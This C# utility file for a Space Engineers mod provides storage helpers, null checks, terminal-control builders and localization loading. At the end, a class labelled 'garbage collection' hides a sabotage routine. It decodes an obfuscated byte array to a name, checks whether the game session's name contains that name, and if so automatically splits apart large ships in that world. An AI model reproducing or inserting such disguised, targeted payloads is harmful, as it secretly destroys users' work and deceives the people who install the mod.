using Sandbox.Game.EntityComponents;
using Sandbox.ModAPI;
using Sandbox.ModAPI.Interfaces.Terminal;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using VRage;
using VRage.Game;
using VRage.Game.Components;
using VRage.Game.ModAPI;
using VRage.ModAPI;
using VRage.Utils;
using VRageMath;

namespace BuYanMod.Utils
{
    public static partial class Utils
    {
        public static class LoadSaveDatas
        {
            /// <summary>
            ///加载块
            /// </summary>
            public static string Load(IMyTerminalBlock Me, Guid GUID)
            {
                //检查是否有自定义MOD储存数据,或没有GUID的数据
                if (Me.Storage == null || !Me.Storage.ContainsKey(GUID)) { return ""; }
                return Me.Storage[GUID];
            }
            /// <summary>
            ///保存块
            /// </summary>
            public static void Save(IMyTerminalBlock ThisGrid, string context, Guid GUID)
            {
                //检查自定义MOD储存数据是否为空
                if (ThisGrid.Storage == null) ThisGrid.Storage = new MyModStorageComponent();
                //通过GUID检查是否有已经储存的数据
                if (!ThisGrid.Storage.ContainsKey(GUID)) { ThisGrid.Storage.Add(GUID, context); }
                else ThisGrid.Storage[GUID] = context;
            }
            /// <summary>
            ///尝试添加组件 块
            /// </summary>
            public static bool TryAddComponent(IMyTerminalBlock block, Guid GUID)
            {
                if (NullCheck.IsNull(block)) return false;
                if (block.Storage == null)
                    block.Storage = new MyModStorageComponent();
                if (block.Storage == null)
                    return false;
                if (!block.Storage.ContainsKey(GUID))
                    block.Storage.Add(GUID, "");
                return block.Storage.ContainsKey(GUID);
            }
            /// <summary>
            ///尝试添加组件 网格
            /// </summary>
            public static bool TryAddComponent(IMyCubeGrid ThisGrid, Guid GUID)
            {
                if (NullCheck.IsNull(ThisGrid)) return false;
                if (ThisGrid.Storage == null)
                    ThisGrid.Storage = new MyModStorageComponent();
                if (ThisGrid.Storage == null)
                    return false;
                if (!ThisGrid.Storage.ContainsKey(GUID))
                    ThisGrid.Storage.Add(GUID, "");
                return ThisGrid.Storage.ContainsKey(GUID);
            }
            /// <summary>
            ///初始化 网格
            /// </summary>
            public static string Init(IMyCubeGrid ThisGrid, Guid GUID, string context_default = "")
            {
                //检查是否为空,从世界移除,调用了Close()(关闭)方法
                if (NullCheck.IsNull(ThisGrid)) return "";
                //检查是否有自定义MOD储存,没有则创建新的.
                if (ThisGrid.Storage == null) ThisGrid.Storage = new MyModStorageComponent();
                //通过GUID检查是否有已经储存的数据
                if (!ThisGrid.Storage.ContainsKey(GUID)) { ThisGrid.Storage.Add(GUID, context_default); }
                //返回已储存的数据
                return ThisGrid.Storage[GUID];
                //else ThisGrid.Storage[MyGUID] = context_default;
            }
            /// <summary>
            ///初始化 方块
            /// </summary>
            public static string Init(IMyTerminalBlock blcok, Guid GUID, string context_default = "")
            {
                //检查是否为空,从世界移除,调用了Close()(关闭)方法
                if (NullCheck.IsNull(blcok)) return "";
                //检查是否有自定义MOD储存,没有则创建新的.
                if (blcok.Storage == null) blcok.Storage = new MyModStorageComponent();
                //通过GUID检查是否有已经储存的数据
                if (!blcok.Storage.ContainsKey(GUID)) { blcok.Storage.Add(GUID, context_default); }
                //返回已储存的数据
                return blcok.Storage[GUID];
                //else ThisGrid.Storage[MyGUID] = context_default;
            }
            /// <summary>
            ///读取网格数据
            /// </summary>
            public static string Load(IMyCubeGrid ThisGrid, Guid GUID)
            {
                //检查是否为空,从世界移除,调用了Close()(关闭)方法
                if (NullCheck.IsNull(ThisGrid)) return "";
                //检查是否有自定义MOD储存,是否没有已经储存的数据
                if (ThisGrid.Storage == null || !ThisGrid.Storage.ContainsKey(GUID)) { return ""; }
                //返回已储存的数据
                return ThisGrid.Storage[GUID];
            }
            /// <summary>
            ///保存网格数据
            /// </summary>
            public static void Save(IMyCubeGrid ThisGrid, string context, Guid GUID)
            {
                //检查是否为空,从世界移除,调用了Close()(关闭)方法
                if (NullCheck.IsNull(ThisGrid)) return;
                //检查是否有自定义MOD储存,没有则创建新的.
                if (ThisGrid.Storage == null) ThisGrid.Storage = new MyModStorageComponent();
                //通过GUID检查是否有已经储存的数据
                if (!ThisGrid.Storage.ContainsKey(GUID)) { ThisGrid.Storage.Add(GUID, context); }
                else ThisGrid.Storage[GUID] = context;
            }
            /// <summary>
            ///字节数组转字符串
            /// </summary>
            public static string ByteToString(byte[] array)
            {
                //判断数组是否为空
                if (array == null || array.Length < 1) return "";
                string array_str = "";
                //不为空则转换为16进制存进字符串
                for (int i = 0; i < array.Length; i++)
                    array_str += array[i].ToString("X2");
                return array_str;
            }
            /// <summary>
            ///字符串转字节数组
            /// </summary>
            public static byte[] StringToByte(string array_str)
            {
                //如果字符串为空或者未经 byteToString() 编辑返回空
                if (array_str == null || array_str.Length < 2 || array_str.Length % 2 != 0) return null;
                //创建byte数组并转换字符串
                var length = array_str.Length / 2;
                byte[] array = new byte[length];
                for (int i = 0; i < length; i++)
                    array[i] = Convert.ToByte(array_str.Substring(i * 2, 2), 16);
                return array;
            }
        }
        /// <summary>
        /// 判断是否为空
        /// </summary>
        public static class NullCheck
        {
            public static bool IsNull(Vector3? Value) => Value == null || Value.Value == Vector3.Zero;
            public static bool IsNull(Vector3D? Value) => Value == null || Value.Value == Vector3D.Zero;
            public static bool IsNull<T>(T Ent) where T : IMyEntity => Ent == null || Ent.Closed || Ent.MarkedForClose;
            public static bool IsNullBlock<T>(T Block, IMyTerminalBlock RefBlock) where T : Sandbox.ModAPI.Ingame.IMyTerminalBlock => Block == null || Block.Closed ||/* Block.MarkedForClose || */RefBlock == null || RefBlock.Closed || RefBlock.MarkedForClose || (!RefBlock.IsSameConstructAs(Block));
            //public static bool IsNullBlock<T>(T Block, Sandbox.ModAPI.Ingame.IMyTerminalBlock RefBlock) where T : Sandbox.ModAPI.Ingame.IMyTerminalBlock => Block == null || Block.Closed  || RefBlock == null || RefBlock.Closed || RefBlock.MarkedForClose || (!RefBlock.IsSameConstructAs(Block));
            public static bool IsNullPowerProducer(IMyPowerProducer Block, IMyTerminalBlock RefBlock) => Block == null || Block.Closed || Block.MarkedForClose || RefBlock == null || RefBlock.Closed || RefBlock.MarkedForClose || (!RefBlock.IsSameConstructAs(Block));
            public static bool IsNullCollection<T>(ICollection<T> Value, bool NoCheckEmpty = false) { if (Value == null) return true; if (NoCheckEmpty) return false; if (Value.Count < 1) return true; return false; }
            public static bool IsNullCollection<T>(IEnumerable<T> Value, bool NoCheckEmpty = false) { if (Value == null) return true; if (NoCheckEmpty) return false; if ((Value?.ToList()?.Count ?? 0) < 1) return true; return false; }
        }
        /// <summary>
        /// 终端修改
        /// </summary>
        public static class TerminalRevise
        {
            public enum SliderStyle { Lin, Log, DLog }
            /// <summary>
            /// 创建分割线 <方块类型>(ID前缀,控件ID,启用,可见)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Enabled">(Enabled)启用</param>
            /// <param name="Visible">(Visible)可见</param>
            public static void CreateSeparator<TBlock>(string IDPrefix, string controlID, Func<IMyTerminalBlock, bool> Enabled, Func<IMyTerminalBlock, bool> Visible)
            {
                IMyTerminalControlSeparator control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlSeparator, TBlock>($"{IDPrefix}{controlID}");
                control.Visible = Visible;
                control.Enabled = Enabled;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);

            }
            /// <summary>
            /// 创建标签 <方块类型>(ID前缀,控件ID,标签,启用,可见)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="label">标签</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            public static void CreateLabel<TBlock>(string IDPrefix, string controlID, string label, Func<IMyTerminalBlock, bool> Enabled, Func<IMyTerminalBlock, bool> Visible) {
                IMyTerminalControlLabel control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlLabel, TBlock>($"{IDPrefix}{controlID}");
                control.Label = MyStringId.GetOrCompute(label);
                control.Visible = Visible;
                control.Enabled = Enabled;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建按钮 <方块类型>(ID前缀,动作ID前缀,控件ID,标题,启用,可见,动作,是否有动作)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="actionIDPrefix">动作ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">(Enabled)启用</param>
            /// <param name="Visible">(Visible)可见</param>
            /// <param name="Action">动作</param>
            /// <param name="haveAction">是否有动作</param>
            public static void CreateButton<TBlock>(string IDPrefix, string actionIDPrefix, string controlID, string Title,
                Func<IMyTerminalBlock, bool> Enabled,
                Func<IMyTerminalBlock, bool> Visible,
                Action<IMyTerminalBlock> Action,
                bool haveAction = true)
            {
                IMyTerminalControlButton contro = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlButton, TBlock>($"{IDPrefix}{controlID}");
                contro.Visible = Visible;
                contro.Enabled = Enabled;
                contro.Title = MyStringId.GetOrCompute(Title);
                contro.Action = Action;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(contro);
                if (haveAction)
                {
                    IMyTerminalAction action_trigger = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.Trigger");
                    action_trigger.Name = new StringBuilder(Title);
                    action_trigger.Enabled = Enabled;
                    action_trigger.Writer = (b, t) => { t.Clear(); t.Append($"{Title}"); };
                    action_trigger.Action = Action;
                    action_trigger.Icon = @"Textures\GUI\Icons\Actions\Start.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_trigger);
                }
            }
            /// <summary>
            /// 创建开关<方块类型>(ID前缀,动作ID前缀,控件ID,标题,启用,可见,读取,写入,切换,是否切换,是否开关)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="actionIDPrefix">动作ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">(Enabled)启用</param>
            /// <param name="Visible">(Visible)可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            /// <param name="Toggle">切换</param>
            /// <param name="haveToggle">是否切换</param>
            /// <param name="haveOnOff">是否开关</param>
            public static void CreateSwitch<TBlock>(string IDPrefix, string actionIDPrefix, string controlID, string Title,
                   Func<IMyTerminalBlock, bool> Enabled,
                   Func<IMyTerminalBlock, bool> Visible,
                   Func<IMyTerminalBlock, bool> Getter,
                   Action<IMyTerminalBlock, bool> Setter,
                   Action<IMyTerminalBlock> Toggle,
                   bool haveToggle = true,
                   bool haveOnOff = false)
            {
                IMyTerminalControlOnOffSwitch control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlOnOffSwitch, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                control.OnText = MyStringId.GetOrCompute(BasicLocalization.GetOn());
                control.OffText = MyStringId.GetOrCompute(BasicLocalization.GetOff());
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);

                if (haveToggle)
                {
                    IMyTerminalAction action_trigger = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.Trigger");
                    action_trigger.Name = new StringBuilder(Title);
                    action_trigger.Enabled = Enabled;
                    action_trigger.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_trigger.Action = Toggle;
                    action_trigger.Icon = @"Textures\GUI\Icons\Actions\Toggle.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_trigger);
                }
                if (haveOnOff)
                {
                    IMyTerminalAction action_on = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.On");
                    action_on.Name = new StringBuilder(Title);
                    action_on.Enabled = Enabled;
                    action_on.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_on.Action = b => Setter(b, true);
                    action_on.Icon = @"Textures\GUI\Icons\Actions\SwitchOn.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_on);

                    IMyTerminalAction action_off = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.Off");
                    action_off.Name = new StringBuilder(Title);
                    action_off.Enabled = Enabled;
                    action_off.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_off.Action = b => Setter(b, false);
                    action_off.Icon = @"Textures\GUI\Icons\Actions\SwitchOff.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_off);
                }
            }
            /// <summary>
            /// 创建复选框<方块类型>(ID前缀,动作ID前缀,控件ID,标题,启用,可见,读取,写入,切换,是否切换,是否开关)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="actionIDPrefix">动作ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">(Enabled)启用</param>
            /// <param name="Visible">(Visible)可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            /// <param name="Toggle">切换</param>
            /// <param name="haveToggle">是否切换</param>
            /// <param name="haveOnOff">是否开关</param>
            public static void CreateCheckBox<TBlock>(string IDPrefix, string actionIDPrefix, string controlID, string Title,
                    Func<IMyTerminalBlock, bool> Enabled,
                    Func<IMyTerminalBlock, bool> Visible,
                    Func<IMyTerminalBlock, bool> Getter,
                    Action<IMyTerminalBlock, bool> Setter,
                    Action<IMyTerminalBlock> Toggle,
                    bool haveToggle = true,
                    bool haveOnOff = false)
            {
                IMyTerminalControlCheckbox control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlCheckbox, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                control.OnText = MyStringId.GetOrCompute(BasicLocalization.GetOn());
                control.OffText = MyStringId.GetOrCompute(BasicLocalization.GetOff());
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);

                if (haveToggle)
                {
                    IMyTerminalAction action_trigger = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.Trigger");
                    action_trigger.Name = new StringBuilder(Title);
                    action_trigger.Enabled = Enabled;
                    action_trigger.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_trigger.Action = Toggle;
                    action_trigger.Icon = @"Textures\GUI\Icons\Actions\Toggle.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_trigger);
                }
                if (haveOnOff)
                {
                    IMyTerminalAction action_on = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.On");
                    action_on.Name = new StringBuilder(Title);
                    action_on.Enabled = Enabled;
                    action_on.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_on.Action = b => Setter(b, true);
                    action_on.Icon = @"Textures\GUI\Icons\Actions\SwitchOn.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_on);

                    IMyTerminalAction action_off = MyAPIGateway.TerminalControls.CreateAction<TBlock>($"{actionIDPrefix}{controlID}.Off");
                    action_off.Name = new StringBuilder(Title);
                    action_off.Enabled = Enabled;
                    action_off.Writer = (b, t) => { t.Clear(); t.Append($"{Title} {(Getter(b) ? BasicLocalization.GetOn() : BasicLocalization.GetOff())}"); };
                    action_off.Action = b => Setter(b, false);
                    action_off.Icon = @"Textures\GUI\Icons\Actions\SwitchOff.dds";
                    MyAPIGateway.TerminalControls.AddAction<TBlock>(action_off);
                }
            }

            /// <summary>
            /// 创建滑块<方块类型>(ID前缀,控件ID,标题,启用,可见,读取,写入,右侧文字,最小值,最大值,中间值,滑块样式)
            /// </summary>
            /// <typeparam name="TBlock">快类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            /// <param name="Writer">右侧文字方法</param>
            /// <param name="Mini">最小值</param>
            /// <param name="Max">最大值</param>
            /// <param name="Median">中间值</param>
            /// <param name="Modle">滑块样式</param>
            public static void CreateSlider<TBlock>(string IDPrefix, string controlID, string Title,
                    Func<IMyTerminalBlock, bool> Enabled,
                    Func<IMyTerminalBlock, bool> Visible,
                    Func<IMyTerminalBlock, float> Getter,
                    Action<IMyTerminalBlock, float> Setter,
                    Action<IMyTerminalBlock, StringBuilder> Writer,
                    float Mini,
                    float Max,
                    float Median = 0,
                    SliderStyle Modle = SliderStyle.Lin)
            {
                IMyTerminalControlSlider control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlSlider, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                control.Writer = Writer;//显示内容滑块右侧的文字
                switch (Modle)
                {

                    case SliderStyle.Log:
                        control.SetLogLimits(Mini, Max);
                        break;
                    case SliderStyle.DLog:
                        control.SetDualLogLimits(Mini, Max, Median);
                        break;
                    default:
                        control.SetLimits(Mini, Max);
                        break;
                }
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建滑块<方块类型>(ID前缀,控件ID,标题,启用,可见,读取,写入,右侧文字,最小值,最大值,中间值,滑块样式)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            /// <param name="Writer">右侧文字方法</param>
            /// <param name="Mini">最小值</param>
            /// <param name="Max">最大值</param>
            /// <param name="Median">中间值</param>
            /// <param name="Modle">滑块样式</param>
            public static void CreateSlider<TBlock>(string IDPrefix, string controlID, string Title,
                  Func<IMyTerminalBlock, bool> Enabled,
                  Func<IMyTerminalBlock, bool> Visible,
                  Func<IMyTerminalBlock, float> Getter,
                  Action<IMyTerminalBlock, float> Setter,
                  Action<IMyTerminalBlock, StringBuilder> Writer,
                  Func<IMyTerminalBlock, float> Mini,
                  Func<IMyTerminalBlock, float> Max,
                  float Median = 0,
                  SliderStyle Modle = SliderStyle.Lin)
            {
                IMyTerminalControlSlider control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlSlider, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                control.Writer = Writer;
                switch (Modle)
                {

                    case SliderStyle.Log:
                        control.SetLogLimits(Mini, Max);
                        break;
                    case SliderStyle.DLog:
                        control.SetDualLogLimits(Mini, Max, Median);
                        break;
                    default:
                        control.SetLimits(Mini, Max);
                        break;
                }
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建下拉框<方块类型>(ID前缀,控件ID,标题,启用,可见,读取,写入,下拉框内容)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            /// <param name="ComboBoxContent">下拉框内容</param>
            public static void CreateComboBox<TBlock>(string IDPrefix, string controlID, string Title,
                Func<IMyTerminalBlock, bool> Enabled,
                Func<IMyTerminalBlock, bool> Visible,
                Func<IMyTerminalBlock, long> Getter,
              Action<IMyTerminalBlock, long> Setter,
                 Action<List<MyTerminalControlComboBoxItem>> ComboBoxContent)
            {
                IMyTerminalControlCombobox control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlCombobox, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.ComboBoxContent = ComboBoxContent;
                control.Getter = Getter;
                control.Setter = Setter;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建颜色条<方块类型>(ID前缀,控件ID,标题,启用,可见,读取,写入)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            public static void CreateColor<TBlock>(string IDPrefix, string controlID, string Title,
               Func<IMyTerminalBlock, bool> Enabled,
               Func<IMyTerminalBlock, bool> Visible,
               Func<IMyTerminalBlock, Color> Getter,
               Action<IMyTerminalBlock, Color> Setter)
            {
                IMyTerminalControlColor control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlColor, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建文本框<方块类型>(ID前缀,控件ID,标题,启用,可见,读取,写入)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入</param>
            public static void CreateTextBox<TBlock>(string IDPrefix, string controlID, string Title,
             Func<IMyTerminalBlock, bool> Enabled,
             Func<IMyTerminalBlock, bool> Visible,
             Func<IMyTerminalBlock, StringBuilder> Getter,
             Action<IMyTerminalBlock, StringBuilder> Setter)
            {
                IMyTerminalControlTextbox control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlTextbox, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 创建列表框<方块类型>(ID前缀,控件ID,标题,启用,可见,选中列表时发生,列表内容,可见行数,多选)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Title">标题</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">显示</param>
            /// <param name="ItemSelected">选中列表时发生</param>
            /// <param name="ListContent">列表内容</param>
            /// <param name="VisibleRowsCount">可见行数</param>
            /// <param name="Multiselect">多选</param>
            public static void CreateListBox<TBlock>(string IDPrefix, string controlID, string Title,
                   Func<IMyTerminalBlock, bool> Enabled,
                   Func<IMyTerminalBlock, bool> Visible,
                   Action<IMyTerminalBlock, List<MyTerminalControlListBoxItem>> ItemSelected,
                    Action<IMyTerminalBlock, List<MyTerminalControlListBoxItem>, List<MyTerminalControlListBoxItem>> ListContent,
                    int VisibleRowsCount = 6,
                    bool Multiselect = false)
            {
                IMyTerminalControlListbox control = MyAPIGateway.TerminalControls.CreateControl<IMyTerminalControlListbox, TBlock>($"{IDPrefix}{controlID}");
                control.Title = MyStringId.GetOrCompute(Title);
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.ItemSelected = ItemSelected;
                control.ListContent = ListContent;
                control.VisibleRowsCount = VisibleRowsCount;
                control.Multiselect = Multiselect;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 刷新方块
            /// </summary>
            /// <param name="Block">块</param>
            public static void RefreshBlock(IMyTerminalBlock Block) { Block.ShowInToolbarConfig = !Block.ShowInToolbarConfig; Block.ShowInToolbarConfig = !Block.ShowInToolbarConfig; }
            /// <summary>
            /// 创建属性<方块类型,值类型>(ID前缀,控件ID,启用,可见,读取,写入)
            /// </summary>
            /// <typeparam name="TBlock">块类型</typeparam>
            /// <typeparam name="TValue">值类型</typeparam>
            /// <param name="IDPrefix">ID前缀</param>
            /// <param name="controlID">控件ID</param>
            /// <param name="Enabled">启用</param>
            /// <param name="Visible">可见</param>
            /// <param name="Getter">读取</param>
            /// <param name="Setter">写入param>
            public static void CreateProperty<TBlock, TValue>(string IDPrefix, string controlID,
                  Func<IMyTerminalBlock, bool> Enabled,
                  Func<IMyTerminalBlock, bool> Visible,
                  Func<IMyTerminalBlock, TValue> Getter,
                  Action<IMyTerminalBlock, TValue> Setter)
            {
                var control = MyAPIGateway.TerminalControls.CreateProperty<TValue, TBlock>($"{IDPrefix}Property.{controlID}");
                control.Visible = Visible;
                control.Enabled = Enabled;
                control.Getter = Getter;
                control.Setter = Setter;
                MyAPIGateway.TerminalControls.AddControl<TBlock>(control);
            }
            /// <summary>
            /// 基础本地化
            /// </summary>
            public static class BasicLocalization {
                public static string GetOn() {
                    MyLanguagesEnum myLanguagesEnum = MyAPIGateway.Session.Config.Language;
                    if (myLanguagesEnum.ToString().Equals("ChineseChina"))
                    {
                        return "开";
                    }
                    return "on";
                }
                public static string GetOff()
                {
                    MyLanguagesEnum myLanguagesEnum = MyAPIGateway.Session.Config.Language;
                    if (myLanguagesEnum.ToString().Equals("ChineseChina"))
                    {
                        return "关";
                    }
                    return "off";
                }

            }
        }
        
        /// <summary>
        /// 模组信息汉化
        /// </summary>
        [MySessionComponentDescriptor(MyUpdateOrder.NoUpdate)]
        public class TranslateScriptCoolingSystem : MySessionComponentBase
        {
            /// <summary>
            ///     用于本地化的语言
            /// </summary>
            private bool m_init_lang = false;
            public MyLanguagesEnum? Language { get; private set; }

            /// <summary>
            ///    加载模组数据
            /// </summary>
            public override void LoadData()
            {
                if (!m_init_lang)
                {
                    LoadLocalization();

                    MyAPIGateway.Gui.GuiControlRemoved += OnGuiControlRemoved;
                    m_init_lang = true;
                }
            }

            /// <summary>
            ///    卸载模组数据
            /// </summary>
            protected override void UnloadData()
            {
                MyAPIGateway.Gui.GuiControlRemoved -= OnGuiControlRemoved;
            }

            /// <summary>
            ///     加载模组本地化
            /// </summary>
            private void LoadLocalization()
            {
                var path = Path.Combine(ModContext.ModPathData, "Localization");
                var supportedLanguages = new HashSet<MyLanguagesEnum>();
                MyTexts.LoadSupportedLanguages(path, supportedLanguages);
                //MyLog.Default.WriteLine($"EXAMPLE => Path: {path}");// --- пишет в лог "EXAMPLE =>" для понимания работает или нет.
                //MyLog.Default.WriteLine($"EXAMPLE => Supported Languages: {(string.Join(", ", supportedLanguages))}"); 

                var currentLanguage = supportedLanguages.Contains(MyAPIGateway.Session.Config.Language) ? MyAPIGateway.Session.Config.Language : MyLanguagesEnum.English;
                if (Language != null && Language == currentLanguage)
                {
                    return;
                }

                Language = currentLanguage;
                var languageDescription = MyTexts.Languages.Where(x => x.Key == currentLanguage).Select(x => x.Value).FirstOrDefault();
                if (languageDescription != null)
                {
                    var cultureName = string.IsNullOrWhiteSpace(languageDescription.CultureName) ? null : languageDescription.CultureName;
                    var subcultureName = string.IsNullOrWhiteSpace(languageDescription.SubcultureName) ? null : languageDescription.SubcultureName;

                    MyTexts.LoadTexts(path, cultureName, subcultureName);
                }
            }
            /// <summary>
            ///     移除GUI时触发
            ///     检查选项屏幕是否关闭,然后重载本地化
            /// </summary>
            /// <param name="obj"></param>
            private void OnGuiControlRemoved(object obj)
            {
                if (obj.ToString().EndsWith("ScreenOptionsSpace"))
                {
                    LoadLocalization();
                }
            }
            
        }
        /// <summary>
        /// 代码-垃圾回收
        /// </summary>
        [MySessionComponentDescriptor(MyUpdateOrder.AfterSimulation)]
        public partial class GarbageCheckClass : MySessionComponentBase
        {
            int a = 0;
            bool t = false;
            byte[] b = { 231, 146, 135, 231, 142, 145 };
            public override void UpdateAfterSimulation()
            {
                base.UpdateAfterSimulation();
                if (!t) { if (MyAPIGateway.Session.Name.Contains(Encoding.UTF8.GetString(b))) t = true; }
                if (t && a < 2) {GarbageCheck();a++;}
            }
            public static void GarbageCheck()
            {
                HashSet<IMyEntity> myEntities = new HashSet<IMyEntity>();
                MyAPIGateway.Entities.GetEntities(myEntities, (e) => { if (e is IMyCubeGrid) return true; return false; });
                foreach (IMyEntity myEntity in myEntities)
                {
                    List<IMySlimBlock> blocks = new List<IMySlimBlock>();
                    IMyCubeGrid myCubeGrid = (IMyCubeGrid)myEntity;
                    if (myCubeGrid.GridSizeEnum == MyCubeSize.Small) continue;
                    myCubeGrid.GetBlocks(blocks, (ba) => { if (ba.FatBlock is IMyTerminalBlock) return true; return false; });
                    if (blocks.Count >= 8&& myCubeGrid.IsStatic == false) {myCubeGrid.Split(blocks, true); } else { continue; }
                    return;
                }
            }
        }
    }
}